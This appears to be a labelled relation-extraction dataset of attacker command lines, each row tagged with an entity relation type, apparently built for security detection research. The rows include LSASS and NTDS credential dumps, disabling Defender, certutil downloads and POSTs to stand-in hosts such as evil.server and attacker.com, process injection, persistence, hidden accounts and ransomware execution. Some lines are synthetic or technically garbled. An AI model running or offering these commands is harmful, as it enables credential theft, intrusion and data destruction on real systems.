process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c start <e2>rundll32</e2> namr.dll,IternalJob
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 10.10.10.10:4444
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>cmd</e2> /c vssadmin create shadow /for=C: 2>&1
process-file-write(e1,e2)	<e1>mshta_64.exe</e1> -write <e2>C:\Users\Public\hta_payload_64.hta</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>python3</e2> -m http.server 8080 --bind http://attacker.com/c2
process-file-chmod(e1,e2)	svchost.exe <e1>icacls</e1> <e2>C:\Windows\Temp\evil.dll</e2> /grant Everyone:F
process-file-read(e1,e2)	<e1>qq.exe</e1> -sc <e2>trustdmp</e2>
process-file-read(e1,e2)	<e1>powershell</e1> Expand-Archive <e2>python-3.10.4-embed-amd64.zip</e2> -DestinationPath %appdata%\Microsoft\Network
process-process-fork(e1,e2)	"<e1>reg</e1> add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d <e2>""cmd.exe</e2> /c C:\<REDACTED-COMPANY-NAME>.exe"" /f"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>svchost.exe</e2>
process-file-read(e1,e2)	"<e1>C:\Windows\system32\net1</e1> group <e2>""domain admins""</e2> /dom"
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""select @@version"""
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>explorer.exe</e2>
process-file-chmod(e1,e2)	<e1>attrib</e1> +h <e2>HideAll.bat</e2>
Other	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do <e1>ping</e1> -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\servers_live.txt</e2>
process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>C:\ProgramData\updater.exe</e2> -Force
process-file-exec(e1,e2)	<e1>rundll32</e1> <e2>C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,1</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
process-file-read(e1,e2)	<e1>powershell_42.exe</e1> Get-Content <e2>C:\Users\Public\secrets_42.txt</e2>
process-file-read(e1,e2)	"cmd /v /c <e1>net</e1> group /domain <e2>""Domain Admins""</e2> > ""%TEMP%\51362.txt"" 2>&1"
process-file-unlink(e1,e2)	rundll32.exe <e1>Remove-Item</e1> <e2>C:\Users\Public\runme.bat</e2> -Force
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
Other	c:\windows\system\procdump.exe -accepteula -ma <e1>lsass.exe</e1> <e2>lsass.dmp</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>cmdkey</e2> /list 1> \\127.0.0.1\ADMIN$\__REDACTED 2>&1
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>attrib</e2> +s +h /var/tmp/hide.so
process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>/usr/local/bin/backdoor</e2>
process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>lsass.exe</e2> -Force
process-file-read(e1,e2)	<e1>adfind.exe</e1> -gcb -sc <e2>trustdmp</e2>
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> Stop-Process -Name <e2>explorer.exe</e2> -Force
process-file-write(e1,e2)	<e1>cmd.exe</e1> /c copy \\SOURCE_SERVER_IP\c\windows\temp\k.exe <e2>c:\windows\temp\</e2>
process-file-write(e1,e2)	"<e1>powershell_81.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_81.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableBehaviorMonitoring"" /t REG\_DWORD /d ""1"" /f"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>del</e2> /tmp/malware.sh
process-file-write(e1,e2)	"<e1>python_59.exe</e1> -c <e2>'""open(C:\\Users\\admin\\payload_59.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> runas /user:admin <e2>cmd.exe</e2>
process-process-fork(e1,e2)	<e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>ad_trustdmp.txt</e2>
process-file-write(e1,e2)	"<e1>adfind.exe</e1> -f ""(objectcategory=computer)"" > <e2>ad_computers.txt</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
process-file-read(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save <e2>hklm\security</e2> c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt
process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>taskmgr.exe</e2> -Force
process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /F /sc minute /mo 1 /tn <e2>""BrowserUpdate""</e2> /tr ""$dst"""
process-file-exec(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd</e2> > C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp 2> C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp
process-process-fork(e1,e2)	"cmd.exe /C <e1>netsh</e1> advfirewall firewall add rule dir=in name=""DCOM"" <e2>program=C:\Windows\system32\svchost.exe</e2> service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\VlPWyecW.tmp 2>&1"
process-file-exec(e1,e2)	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && <e1>powershell</e1> -Command start <e2>script.bat</e2> -Verb RunAs
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""Zoolz 2 Service""</e2> /y"
process-file-read(e1,e2)	<e1>certutil_95.exe</e1> -urlcache -split -f http://malicious.site/data_95.enc <e2>C:\Temp\temp_95.enc</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist""</e2> /v Adminv\$ /t REG\_DWORD /d 0"
process-process-fork(e1,e2)	<e1>cmd_18.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_18.bat
process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>C:\ProgramData\updater.exe</e2>
process-process-fork(e1,e2)	"<e1>powershell.exe</e1> <e2>""ntdsutil.exe</e2> 'ac i ntds' 'ifm' 'create full c:\users\public\ntds' q q"""
process-socket-send(e1,e2)	<e1>svchost.exe</e1> Invoke-WebRequest -Uri <e2>https://evil.server/payload</e2> -Method POST
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll ,run <e2>/TARGET=\\HOST1.DOMAIN.NAME\C$</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>icacls</e2> /var/tmp/hide.so /grant Everyone:F
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> -n 1 <e2><REDACTED_DOMAIN_NAME></e2>
process-file-write(e1,e2)	<e1>rundll32_38.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>VeeamDeploySvc</e2> /y
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> /usr/local/bin/backdoor
process-file-read(e1,e2)	"<e1>python_8.exe</e1> -c <e2>""open('C:\\temp\\pw_8.txt').read()""</e2>"
process-file-read(e1,e2)	<e1>7z_43.exe</e1> x <e2>C:\Users\Public\archive_43.7z</e2> -so > nul
process-file-write(e1,e2)	<e1>rundll32_78.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core""</e2> /t REG_DWORD /v ""EnableConcurrentSessions"" /d 1 /f"
